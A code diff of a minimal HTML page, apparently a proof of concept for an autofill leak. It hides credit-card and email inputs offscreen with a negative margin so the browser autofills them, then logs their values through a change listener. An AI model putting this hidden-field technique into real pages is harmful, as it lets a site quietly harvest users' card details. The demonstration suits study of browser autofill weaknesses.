@@ -1,33 +1,36 @@
 <html>
   <head>
     <style>
-      .hide { display: none; }
+      .hide { margin-left: -1000px; }
     </style>
   </head>
   <body>
-    <label class="hide" for="frmNameCC">Name on card</label>
-    <input class="hide" name="ccname" id="frmNameCC" required placeholder="Full Name" autocomplete="cc-name">
-
-    <label class="hide" for="frmCCNum">Card Number</label>
-    <input class="hide" name="cardnumber" id="frmCCNum" required autocomplete="cc-number">
-
-    <label class="hide" for="frmCCCVC">CVC</label>
-    <input class="hide" name="cvc" id="frmCCCVC" required autocomplete="cc-csc">
-
-    <label class="hide" for="frmCCExp">Expiry</label>
-    <input class="hide" name="cc-exp" id="frmCCExp" required placeholder="MM-YYYY" autocomplete="cc-exp">
-
-    <input name="name" required placeholder="Name" automplete="name">
-    <input name="email" required placeholder="email" autocomplete="email">
-
+    <p>
+      <label class="hide" for="frmNameCC">Name on card</label>
+      <input class="hide" name="ccname" id="frmNameCC" required placeholder="Full Name" autocomplete="cc-name">
+    </p>
+    <p>
+      <label class="hide" for="frmCCNum">Card Number</label>
+      <input class="hide" name="cardnumber" id="frmCCNum" required autocomplete="cc-number">
+    </p>
+    <p>
+      <label class="hide" for="frmCCCVC">CVC</label>
+      <input class="hide" name="cvc" id="frmCCCVC" required autocomplete="cc-csc">
+    </p>
+    <p>
+      <label class="hide" for="frmCCExp">Expiry</label>
+      <input class="hide" name="cc-exp" id="frmCCExp" required placeholder="MM-YYYY" autocomplete="cc-exp">
+    </p>
+    <p>
+      <input name="email" required placeholder="email" autocomplete="email">
+    </p>
+    <p>
+      <input name="email" class="hide" required placeholder="email" autocomplete="email">
+    </p>
     <script>
-      function onChange (e) {
-        console.log(e.target.name + ":" + e.target.value);
-      };
-      var els = document.getElementsByClassName('hide');
-      [].forEach.call(els, function (el) {
-        el.addEventListener('DOMAutoComplete', onChange);
-      });
+      function onChange (e) { console.log(e.target.name + ":" + e.target.value) };
+      var els = document.getElementsByClassName("hide");
+      [].forEach.call(els, function(e) { e.addEventListener('change', onChange) });
     </script>
   </body>
 </html>
